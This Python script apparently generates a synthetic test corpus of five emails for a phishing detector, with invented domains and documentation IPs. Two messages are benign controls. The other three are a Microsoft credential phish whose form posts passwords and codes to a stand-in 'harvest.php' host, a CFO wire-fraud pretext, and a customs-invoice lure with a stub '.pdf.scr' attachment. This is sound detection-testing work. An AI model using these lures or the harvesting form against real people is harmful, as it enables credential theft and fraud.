#!/usr/bin/env python3
"""Generate the synthetic sample corpus.

Every message in ``samples/`` is produced by this script. None of it is real
mail: there are no real recipients, the IP addresses come from the RFC 5737
documentation ranges, and the attacker-controlled domains are invented. That
matters for a public repository -- a phishing corpus scraped from a live mailbox
carries other people's personal data, and committing one is not something to do
casually.

The corpus is built to exercise both directions of the tool. Two messages are
benign and link-heavy, which is exactly the shape that makes naive phishing
detectors produce false positives.

    python samples/generate.py
"""

from __future__ import annotations

import email.utils
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).parent
BASE = datetime(2026, 3, 14, 9, 12, 4, tzinfo=timezone.utc)


def rfc(dt: datetime) -> str:
    return email.utils.format_datetime(dt)


def build(headers: list[tuple[str, str]], body: str) -> bytes:
    """Assemble a message with CRLF line endings.

    Normalise to LF first and only then expand: joining with CRLF and *then*
    replacing every LF produces CRCRLF, which no RFC 5322 parser will accept as
    a header separator.
    """
    lines = [f"{k}: {v}" for k, v in headers]
    text = "\n".join(lines) + "\n\n" + body
    return text.replace("\r\n", "\n").replace("\n", "\r\n").encode("utf-8")


def mime(headers: list[tuple[str, str]], parts: list[tuple[str, str, str]],
         boundary: str = "----=_Part_8b12f0a1") -> bytes:
    """parts: (content-type, transfer-encoding-or-disposition, payload)"""
    headers = headers + [
        ("MIME-Version", "1.0"),
        ("Content-Type", f'multipart/mixed; boundary="{boundary}"'),
    ]
    chunks = []
    for content_type, extra, payload in parts:
        block = [f"--{boundary}", f"Content-Type: {content_type}"]
        if extra:
            block.append(extra)
        block.append("")
        block.append(payload)
        chunks.append("\n".join(block))
    body = "\n".join(chunks) + f"\n--{boundary}--\n"
    return build(headers, body)


# --------------------------------------------------------------------------
# 1. Benign newsletter -- authenticated, aligned, link-heavy.
# --------------------------------------------------------------------------
def benign_newsletter() -> bytes:
    t = BASE
    headers = [
        ("Received", f"from mail.github.com (out-27.smtp.github.com [192.0.2.27]) "
                     f"by mx.example-corp.com with ESMTPS id 4Kx8m2; {rfc(t)}"),
        ("Received", f"from github-mailer.internal (localhost [127.0.0.1]) "
                     f"by mail.github.com with ESMTP id 9Qm1; {rfc(t - timedelta(seconds=3))}"),
        ("Authentication-Results", "mx.example-corp.com; spf=pass "
                                   "smtp.mailfrom=noreply@github.com; dkim=pass "
                                   "header.d=github.com; dmarc=pass header.from=github.com"),
        ("Received-SPF", "pass (mx.example-corp.com: domain of github.com designates "
                         "192.0.2.27 as permitted sender)"),
        ("DKIM-Signature", "v=1; a=rsa-sha256; d=github.com; s=pf2023; c=relaxed/relaxed; "
                           "h=from:to:subject:date; bh=Zx1p9m4Q=; b=Kd8fLp2Q=="),
        ("Return-Path", "<noreply@github.com>"),
        ("From", "GitHub <noreply@github.com>"),
        ("To", "aun@example-corp.com"),
        ("Subject", "Your weekly digest: 4 repositories you follow had releases"),
        ("Date", rfc(t)),
        ("Message-ID", "<a91f2c04-7d3e-4b11-8f60-2c9e4a1b7d55@github.com>"),
        ("List-Unsubscribe", "<https://github.com/settings/notifications>"),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ]
    body = """<html><body style="font-family:sans-serif">
<h2>Your weekly digest</h2>
<p>Hi Aun, here is what happened in the repositories you follow this week.</p>
<ul>
  <li><a href="https://github.com/SigmaHQ/sigma/releases">SigmaHQ/sigma</a> published r2026-03-11</li>
  <li><a href="https://github.com/volatilityfoundation/volatility3/releases">volatility3</a> published v2.9.0</li>
  <li><a href="https://github.com/Yamato-Security/hayabusa/releases">hayabusa</a> published v2.18.0</li>
  <li><a href="https://github.com/arkime/arkime/releases">arkime</a> published v5.2.0</li>
</ul>
<p><a href="https://github.com/settings/notifications">Manage your notification settings</a>
or <a href="https://github.com/settings/notifications">unsubscribe</a>.</p>
<p style="color:#888;font-size:12px">GitHub, Inc. 88 Colin P Kelly Jr Street, San Francisco, CA 94107</p>
</body></html>"""
    return build(headers, body)


# --------------------------------------------------------------------------
# 2. Benign transactional receipt -- many links, urgency-adjacent wording.
#    This is the false-positive control.
# --------------------------------------------------------------------------
def benign_receipt() -> bytes:
    t = BASE + timedelta(hours=2)
    headers = [
        ("Received", f"from smtp.stripe.com (smtp-14.stripe.com [192.0.2.114]) "
                     f"by mx.example-corp.com with ESMTPS id 7Lp3; {rfc(t)}"),
        ("Received", f"from worker-9.stripe.internal (unknown [10.4.2.9]) "
                     f"by smtp.stripe.com with ESMTP id 2Nn8; {rfc(t - timedelta(seconds=5))}"),
        ("Authentication-Results", "mx.example-corp.com; spf=pass "
                                   "smtp.mailfrom=receipts@stripe.com; dkim=pass "
                                   "header.d=stripe.com; dmarc=pass header.from=stripe.com"),
        ("DKIM-Signature", "v=1; a=rsa-sha256; d=stripe.com; s=r1; b=Qp4mZ1a="),
        ("Return-Path", "<receipts@stripe.com>"),
        ("From", "Stripe <receipts@stripe.com>"),
        ("To", "aun@example-corp.com"),
        ("Subject", "Your receipt from Example Corp #2761-4482"),
        ("Date", rfc(t)),
        ("Message-ID", "<rcpt-2761-4482-9f1e@stripe.com>"),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ]
    body = """<html><body>
<h3>Receipt #2761-4482</h3>
<p>Thanks for your payment. Your invoice is now marked as paid.</p>
<table><tr><td>Amount</td><td>$49.00</td></tr>
<tr><td>Date</td><td>14 March 2026</td></tr></table>
<p><a href="https://dashboard.stripe.com/receipts/2761-4482">View receipt</a> ·
<a href="https://dashboard.stripe.com/invoices">Billing history</a> ·
<a href="https://support.stripe.com">Contact support</a></p>
<p>If you need to update your payment details, do so from your
<a href="https://dashboard.stripe.com/settings/billing">billing settings</a>.</p>
</body></html>"""
    return build(headers, body)


# --------------------------------------------------------------------------
# 3. Credential phishing -- brand impersonation, auth failure, anchor mismatch.
# --------------------------------------------------------------------------
def credential_phish() -> bytes:
    t = BASE + timedelta(hours=5)
    headers = [
        ("Received", f"from vps-4471.hosting-cheap.xyz (vps-4471.hosting-cheap.xyz "
                     f"[198.51.100.71]) by mx.example-corp.com with ESMTP id 3Zz9; {rfc(t)}"),
        ("Authentication-Results", "mx.example-corp.com; spf=fail "
                                   "smtp.mailfrom=alerts@micros0ft-security.tk; dkim=none; "
                                   "dmarc=fail header.from=microsoft.com"),
        ("Received-SPF", "fail (mx.example-corp.com: domain of micros0ft-security.tk "
                         "does not designate 198.51.100.71 as permitted sender)"),
        ("Return-Path", "<bounce@micros0ft-security.tk>"),
        ("From", "Microsoft 365 Security <alerts@micros0ft-security.tk>"),
        ("Reply-To", "credential.review@mail-verify-desk.top"),
        ("To", "undisclosed-recipients:;"),
        ("Subject", "Action required: unusual sign-in activity on your Microsoft account"),
        ("Date", rfc(t)),
        ("Message-ID", "<9912847362.bulkmailer@hosting-cheap.xyz>"),
        ("X-Mailer", "PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)"),
        ("Delivered-To", "aun@example-corp.com"),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ]
    body = """<html><body style="font-family:Segoe UI,sans-serif">
<div style="font-size:0px;color:#ffffff">
newsletter update quarterly report shipping confirmation invoice attached regards team
</div>
<img src="https://cdn.micros0ft-security.tk/logo.png" width="120" alt="">
<h2>Unusual sign-in activity</h2>
<p>Dear Customer,</p>
<p>We detected an unusual sign-in to your Microsoft account from a new device.
Your account has been locked as a precaution. You must
<b>verify your account</b> within 24 hours or your account will be permanently deleted.</p>
<p style="text-align:center">
<a href="https://login.microsoftonline.com.account-verify.micros0ft-security.tk/auth/login/verify?redirect=https://login.microsoftonline.com"
   style="background:#0067b8;color:#fff;padding:12px 26px;text-decoration:none">
   https://login.microsoftonline.com/verify
</a></p>
<p>Alternatively, confirm your identity below:</p>
<form action="https://collect.mail-verify-desk.top/harvest.php" method="post">
  <input type="email" name="email" placeholder="Email address"><br>
  <input type="password" name="password" placeholder="Password"><br>
  <input type="text" name="otp" placeholder="Verification code"><br>
  <input type="submit" value="Verify account">
</form>
<p>Failure to comply will result in loss of access to all Microsoft 365 services.</p>
<p>Microsoft Account Team</p>
</body></html>"""
    return build(headers, body)


# --------------------------------------------------------------------------
# 4. Business email compromise -- no payload at all.
# --------------------------------------------------------------------------
def bec_wire_fraud() -> bytes:
    t = BASE + timedelta(hours=7)
    headers = [
        ("Received", f"from mail-oa1-f54.google.com (mail-oa1-f54.google.com "
                     f"[203.0.113.54]) by mx.example-corp.com with ESMTPS id 8Vv2; {rfc(t)}"),
        ("Authentication-Results", "mx.example-corp.com; spf=pass "
                                   "smtp.mailfrom=r.mahmood.exec@gmail.com; dkim=pass "
                                   "header.d=gmail.com; dmarc=pass header.from=gmail.com"),
        ("Return-Path", "<r.mahmood.exec@gmail.com>"),
        ("From", "Rehan Mahmood | CFO, Example Corp <r.mahmood.exec@gmail.com>"),
        ("Reply-To", "r.mahmood.finance@consultant-mailbox.online"),
        ("To", "aun@example-corp.com"),
        ("Subject", "Re: Urgent payment"),
        ("Date", rfc(t)),
        ("Message-ID", "<CAF9x2mQ8kL3nT@mail.gmail.com>"),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ]
    body = """Aun,

Are you available? I am in a meeting with the board and cannot talk right now.

I need you to process a wire transfer to a new supplier today. The purchase
order is approved on my side. Please keep this confidential until the
announcement goes out on Monday - we cannot have this discussed internally yet.

Reply to me here and I will send the beneficiary details and SWIFT code.

This is time sensitive.

Rehan Mahmood
Chief Financial Officer
Example Corp
Sent from my iPhone
"""
    return build(headers, body)


# --------------------------------------------------------------------------
# 5. Malware delivery -- double extension plus an encrypted archive.
# --------------------------------------------------------------------------
def malware_attachment() -> bytes:
    t = BASE + timedelta(hours=9)
    headers = [
        ("Received", f"from smtp.invoice-docs.click (smtp.invoice-docs.click "
                     f"[198.51.100.203]) by mx.example-corp.com with ESMTP id 1Rr7; {rfc(t)}"),
        ("Authentication-Results", "mx.example-corp.com; spf=softfail "
                                   "smtp.mailfrom=billing@invoice-docs.click; dkim=none; "
                                   "dmarc=fail header.from=dhl.com"),
        ("Return-Path", "<billing@invoice-docs.click>"),
        ("From", "DHL Express Billing <billing@invoice-docs.click>"),
        ("To", "aun@example-corp.com"),
        ("Subject", "FW: Shipment 8841-2299 held - customs invoice attached"),
        ("Date", rfc(t)),
        ("Message-ID", "<20260314.184204.9931@invoice-docs.click>"),
    ]
    text = """Dear Customer,

Your shipment 8841-2299 is being held at customs pending payment of duties.
The customs invoice is attached. The archive password is DHL2026.

Please open the document immediately - shipments unclaimed within 48 hours
are returned to sender and legal action may follow for unpaid duties.

DHL Express Billing
"""
    return mime(
        headers,
        [
            ('text/plain; charset="utf-8"', "", text),
            ('application/zip; name="customs_invoice_8841.zip"',
             'Content-Disposition: attachment; filename="customs_invoice_8841.zip"',
             "UEsDBBQAAAAIAFAKAAAAAAAAAAAAAAAAAAALAAAAaW52b2ljZS5wZGY="),
            ('application/octet-stream; name="customs_invoice_8841.pdf.scr"',
             'Content-Disposition: attachment; filename="customs_invoice_8841.pdf.scr"',
             "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA="),
        ],
    )


SAMPLES = {
    "benign-newsletter.eml": benign_newsletter,
    "benign-receipt.eml": benign_receipt,
    "credential-phish.eml": credential_phish,
    "bec-wire-fraud.eml": bec_wire_fraud,
    "malware-attachment.eml": malware_attachment,
}


def main() -> None:
    for name, builder in SAMPLES.items():
        path = OUT / name
        path.write_bytes(builder())
        print(f"wrote {path.name} ({path.stat().st_size:,} bytes)")


if __name__ == "__main__":
    main()
